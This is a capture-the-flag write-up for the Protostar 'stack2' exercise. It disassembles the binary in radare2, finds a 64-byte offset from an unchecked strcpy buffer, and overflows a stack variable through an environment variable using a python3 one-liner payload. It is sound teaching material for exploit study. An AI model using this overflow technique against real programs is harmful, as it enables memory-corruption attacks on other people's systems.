# stack 2
## Tools used
- radare2
- python3
## Recon
Running the binary, we're greeted with the following error message:
```shell
stack2: please set the GREENIE environment variable
```
We can quickly add the GREENIE environment variable with the following in bash:
```shell
$ export GREENIE=test
```
Running the binary again gives us
```shell
Try again, you got 0x00000000
```
Alright, our entrypoint is our environment variable, and it looks like we want to overwrite a stack variable so 
that it matches a specific value. Basically the same thing as 
[stack1](https://github.com/aldamd/CTF/tree/main/writeups/protostar/stack1) but with a little spice.

## Disassembly

To keep things interesting, let's do our disassembling and debugging with radare2 instead of gdb this time.
Opening up our binary and analyzing the functions, the main function is the most interesting thing here, so let's peek 
at the disassembly.
```shell
┌ 128: int main (int argc, char **argv, char **envp);
│           ; var int32_t var_4h @ esp+0x4
│           ; var int32_t var_18h @ esp+0x18
│           ; var int32_t var_58h @ esp+0x58
│           ; var int32_t var_5ch @ esp+0x5c
│           0x08048494 b    55             push ebp
│           0x08048495      89e5           mov ebp, esp
│           0x08048497      83e4f0         and esp, 0xfffffff0
│           0x0804849a      83ec60         sub esp, 0x60
│           0x0804849d      c70424e085..   mov dword [esp], str.GREENIE ; [0x80485e0:4]=0x45455247 ; "GREENIE"
│           0x080484a4      e8d3feffff     call sym.imp.getenv         ; char *getenv(const char *name)
│           0x080484a9      8944245c       mov dword [var_5ch], eax
│           0x080484ad      837c245c00     cmp dword [var_5ch], 0
│       ┌─< 0x080484b2      7514           jne 0x80484c8
│       │   0x080484b4      c7442404e8..   mov dword [var_4h], str.please_set_the_GREENIE_environment_variable_n ; [0x80485e8:4]=0x61656c70 ; "please set the GREENIE environment variable\n"
│       │   0x080484bc      c704240100..   mov dword [esp], 1
│       │   0x080484c3      e8f4feffff     call sym.imp.errx           ; void errx(int eval, const char *fmt)
│       └─> 0x080484c8      c744245800..   mov dword [var_58h], 0
│           0x080484d0      8b44245c       mov eax, dword [var_5ch]
│           0x080484d4      89442404       mov dword [var_4h], eax
│           0x080484d8      8d442418       lea eax, [var_18h]
│           0x080484dc      890424         mov dword [esp], eax
│           0x080484df      e8b8feffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
│           0x080484e4      8b442458       mov eax, dword [var_58h]
│           0x080484e8      3d0a0d0a0d     cmp eax, 0xd0a0d0a          ; '\n\r\n\r'
│       ┌─< 0x080484ed      750e           jne 0x80484fd
│       │   0x080484ef      c704241886..   mov dword [esp], str.you_have_correctly_modified_the_variable ; [0x8048618:4]=0x20756f79 ; "you have correctly modified the variable"
│       │   0x080484f6      e8d1feffff     call sym.imp.puts           ; int puts(const char *s)
│      ┌──< 0x080484fb      eb15           jmp 0x8048512
│      │└─> 0x080484fd      8b542458       mov edx, dword [var_58h]
│      │    0x08048501      b841860408     mov eax, str.Try_again__you_got_0x_08x_n ; str.Try_again__you_got_0x_08x_n
│      │                                                               ; 0x8048641 ; "Try again, you got 0x%08x\n"
│      │    0x08048506      89542404       mov dword [var_4h], edx
│      │    0x0804850a      890424         mov dword [esp], eax
│      │    0x0804850d      e89afeffff     call sym.imp.printf         ; int printf(const char *format)
│      │    ; CODE XREF from main @ 0x80484fb(x)
│      └──> 0x08048512      c9             leave
└           0x08048513      c3             ret
```


## Method
Thanks to radare2's annotations, it's a bit simpler to see what's going on in the assembly code. The main items of interest are:
- getenv call to fetch the GREENIE environment variable and errx call if there is no variable (that's the first message we got)
- strcpy is called, and the result is compared to 0xd0a0d0a (\n\r\n\r)
- if the result of the strcpy is equal to 0xd0a0d0a then we win!

By now you should know the drill, we need to find the stack addresses of our entrypoint and the variable we need to spill into 
so we can determine how big of an input we'll need to smash this stack.

We know [var_18h] is loaded into eax right before the strcpy call so it's probably our environment variable, but what's its address?
radare2 has made this really convenient for us: as we can see, at the top of the disassembly, the memory addresses of our local variables 
are printed! [var_18h] is located at esp+0x18. Since the variable [var_58h] is used to compare our environment variable with 0xd0a0d0a, 
it's safe to assume that [var_58h] is our target, which happens to be located at esp+0x58. The offset between the variables is, you guessed it, 0x40 (64).

Looks like we'll need a 64 + 4 character string to store into our environment variable, but the last 4 bytes need to equate to 0xd0a0d0a,
or "\n\r\n\r". \n and \r aren't very easy to type, so we're going to leverage some shell tricks to store this environment variable.
And let's not forget, we're working with little endian, so the last 4 characters will have to be reversed.

Let's whip up a little shell script to accomplish this task:
```shell
$ export GREENIE=$(python3 -c "print('A'*64 + '\x0a\x0d\x0a\x0d')")
$ ./stack2
you have correctly modified the variable
```
